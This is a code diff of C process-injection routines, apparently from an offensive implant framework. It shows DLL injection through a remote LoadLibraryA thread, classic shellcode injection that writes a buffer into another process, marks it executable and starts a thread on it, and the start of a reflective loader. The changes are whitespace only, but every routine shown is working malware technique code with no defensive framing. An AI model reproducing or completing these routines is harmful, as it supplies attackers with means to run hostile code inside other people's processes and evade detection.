@@ -8,21 +8,21 @@ FUNC UINT32 InjectionDll(
 
     HANDLE ProcessHandle = NULL;
     HANDLE ThreadHandle  = NULL;
-    UINT32 bkErrorCode   = 0;
+    UINT32 bkErrorCode = 0;
     PVOID  MemoryAlloc   = NULL;
 
     if ( ProcessId != 0 ) {
-        bkErrorCode = bkProcessOpen( PROCESS_VM_READ | PROCESS_VM_WRITE , FALSE, ProcessId, &ProcessHandle );
+        bkErrorCode =  bkProcessOpen( PROCESS_VM_READ | PROCESS_VM_WRITE , FALSE, ProcessId, &ProcessHandle );
         if ( bkErrorCode != 0 ) goto _Leave;
     }
 
-    bkErrorCode = bkMemAlloc( ProcessHandle, &MemoryAlloc, StringLengthA( DllPath ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    bkErrorCode =  bkMemAlloc( ProcessHandle, &MemoryAlloc, StringLengthA( DllPath ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( bkErrorCode != 0 ) goto _Leave;
 
-    bkErrorCode = bkMemWrite( ProcessHandle, MemoryAlloc, DllPath, StringLengthA( DllPath ) );
+    bkErrorCode =  bkMemWrite( ProcessHandle, MemoryAlloc, DllPath, StringLengthA( DllPath ) );
     if ( bkErrorCode != 0 ) goto _Leave;
     
-    bkErrorCode = bkThreadCreate( ProcessHandle, Instance()->Win32.LoadLibraryA, MemoryAlloc, 0, 0, 0, &ThreadHandle );
+    bkErrorCode =  bkThreadCreate( ProcessHandle, Instance()->Win32.LoadLibraryA, MemoryAlloc, 0, 0, 0, &ThreadHandle );
     if ( bkErrorCode != 0 ) goto _Leave;
     
 _Leave:
@@ -40,23 +40,23 @@ FUNC UINT32 InjectionClassic(
 ) {
     HANDLE ProcessHandle = NULL;
     HANDLE ThreadHandle  = NULL;
-    UINT32 bkErrorCode   = 0;
+    UINT32 bkErrorCode = 0;
 
     if ( ProcessId != 0 ) {
-        bkErrorCode = bkProcessOpen( PROCESS_VM_READ | PROCESS_VM_WRITE , FALSE, ProcessId, &ProcessHandle );
+        bkErrorCode =  bkProcessOpen( PROCESS_VM_READ | PROCESS_VM_WRITE , FALSE, ProcessId, &ProcessHandle );
         if ( bkErrorCode != 0 ) goto _Leave;
     }
 
-    bkErrorCode = bkMemAlloc( ProcessHandle, &ShellcodeMemory, ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    bkErrorCode =  bkMemAlloc( ProcessHandle, &ShellcodeMemory, ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( bkErrorCode != 0 ) goto _Leave;
 
-    bkErrorCode = bkMemWrite( ProcessHandle, ShellcodeMemory, ShellcodeBuffer, ShellcodeSize );
+    bkErrorCode =  bkMemWrite( ProcessHandle, ShellcodeMemory, ShellcodeBuffer, ShellcodeSize );
     if ( bkErrorCode != 0 ) goto _Leave;
 
-    bkErrorCode = bkMemProtect( ProcessHandle, ShellcodeMemory, ShellcodeSize, PAGE_EXECUTE_READ );
+    bkErrorCode =  bkMemProtect( ProcessHandle, ShellcodeMemory, ShellcodeSize, PAGE_EXECUTE_READ );
     if ( bkErrorCode != 0 ) goto _Leave;
 
-    bkErrorCode = bkThreadCreate( ProcessHandle, ShellcodeMemory, NULL, 0, 0, &ThreadId, &ThreadHandle );
+    bkErrorCode =  bkThreadCreate( ProcessHandle, ShellcodeMemory, NULL, 0, 0, &ThreadId, &ThreadHandle );
     if ( bkErrorCode != 0 ) goto _Leave;
 
 _Leave:
@@ -92,7 +92,7 @@ FUNC PVOID InjectionReflective(
     PIMAGE_DATA_DIRECTORY EntryTls    = { 0 };
     PIMAGE_DATA_DIRECTORY EntryExport = { 0 };
     UINT32                ImageSize   = 0;
-    UINT32                bkErrorCode = 0;
+    UINT32                bkErrorCode =  0;
     UINT32                RelocOffset = 0;
     BOOL                  IsDll       = FALSE;
 
